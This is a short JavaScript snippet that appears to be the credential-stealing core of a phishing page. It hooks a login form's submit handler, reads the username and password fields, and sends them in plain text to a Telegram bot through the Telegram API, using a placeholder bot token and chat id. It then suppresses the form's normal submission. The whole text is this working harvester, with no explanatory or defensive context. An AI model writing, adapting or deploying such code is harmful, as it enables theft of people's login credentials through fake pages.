const token = "123456:ABCDEF";
document.getElementById("f").onsubmit = function () {
  var u = document.getElementById("u").value, p = document.getElementById("p").value;
  var x = new XMLHttpRequest();
  x.open("GET", "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=1&text=" + u + ":" + p);
  x.send();
  return false;
};
